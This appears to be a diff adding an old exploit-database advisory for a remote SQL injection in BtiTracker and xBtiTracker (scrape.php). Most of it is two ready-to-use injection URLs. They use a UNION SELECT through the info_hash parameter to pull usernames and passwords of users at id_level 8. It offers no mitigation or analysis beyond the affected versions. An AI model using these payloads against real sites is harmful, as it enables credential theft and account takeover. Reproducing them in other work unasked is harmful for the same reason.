@@ -1,0 +1,20 @@
+## BtiTracker/xBtiTracker Remote SQL Injection Vulnerability
+## Author: InATeam (http://inattack.ru/)
+## Affected versions: BtiTracker <= 1.4.7, xBtiTracker <= 2.0.542
+## Software site: http://www.btiteam.org/
+##
+## ==============================================================================
+## Exploit:
+## ==============================================================================
+## http://site/scrape.php?info_hash=1%27)
+## +UNION+SELECT+0,CONCAT(0x3C623E,username,0x3a,password,0x3C2F623E3C62723E),0,0
+## +FROM+users+WHERE+id_level=8/*
+## ==============================================================================
+## for xBtiTracker we need to specify prefix:
+## ==============================================================================
+## http://site/scrape.php?info_hash=1%27)
+## +UNION+SELECT+0,CONCAT(0x3C623E,username,0x3a,password,0x3C2F623E3C62723E),0,0
+## +FROM+xbtit_users+WHERE+id_level=8/*
+## ==============================================================================
+
+# milw0rm.com [2008-08-25]
